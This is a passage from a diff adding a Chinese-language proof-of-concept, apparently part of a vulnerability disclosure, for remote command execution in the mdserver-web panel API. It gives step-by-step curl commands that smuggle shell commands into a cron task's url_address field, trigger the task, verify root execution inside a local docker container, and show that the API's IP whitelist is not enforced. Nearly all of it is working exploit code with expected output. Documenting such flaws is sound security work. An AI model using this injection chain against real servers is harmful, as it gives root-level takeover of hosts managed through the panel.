+  -d "backup_to=localhost" \
+  -d "attr=" \
+  --data-urlencode "url_address='; id>/tmp/api_pwned.txt; hostname>>/tmp/api_pwned.txt; echo '"
+# 预期: {"status": true, "msg": "添加成功"}
+```
+
+#### Step 3：获取新任务 ID
+
+```bash
+CRON_ID=$(curl -s -X POST http://127.0.0.1:7200/crontab/list \
+  -H "App-Id: test_app_id" \
+  -H "App-Secret: test_app_secret" \
+  -d "p=1&limit=10" | python3 -c "
+import json, sys
+data = json.load(sys.stdin)
+tasks = data.get('data', {}).get('data', [])
+for t in tasks:
+    if t.get('name') == 'api_pwn_task':
+        print(t['id']); break
+")
+echo "[*] 恶意任务 ID: ${CRON_ID}"
+```
+
+#### Step 4：立即触发执行
+
+```bash
+curl -s -X POST http://127.0.0.1:7200/crontab/start_task \
+  -H "App-Id: test_app_id" \
+  -H "App-Secret: test_app_secret" \
+  -d "id=${CRON_ID}"
+# 预期: {"status": true, "msg": "计划任务【api_pwn_task】已执行!"}
+```
+
+#### Step 5：验证 RCE
+
+```bash
+sleep 1
+docker exec mdserver-web-vuln cat /tmp/api_pwned.txt
+# 预期: uid=0(root) gid=0(root) groups=0(root)
+```
+
+#### Step 6：验证 IP 白名单形同虚设
+
+```bash
+# 将白名单设为仅允许 192.168.99.99
+docker exec -it mdserver-web-vuln python3 - << 'EOF'
+import sys, os
+os.chdir('/www/server/mdserver-web/web')
+sys.path.insert(0, '/www/server/mdserver-web/web')
+import core.mw as mw
+mw.M('app').where("app_id=?", ('test_app_id',)).update({'white_list': '192.168.99.99'})
+print("[+] 白名单已改为 192.168.99.99")
+EOF
+
+# 从本机（非 192.168.99.99）发起请求 → 依然成功（白名单从未被校验）
+curl -s -X POST http://127.0.0.1:7200/crontab/list \
+  -H "App-Id: test_app_id" \
+  -H "App-Secret: test_app_secret" \
+  -d "p=1&limit=10"
+# 预期: 仍然返回任务列表，证明 IP 白名单无效
 ```
 
 ---
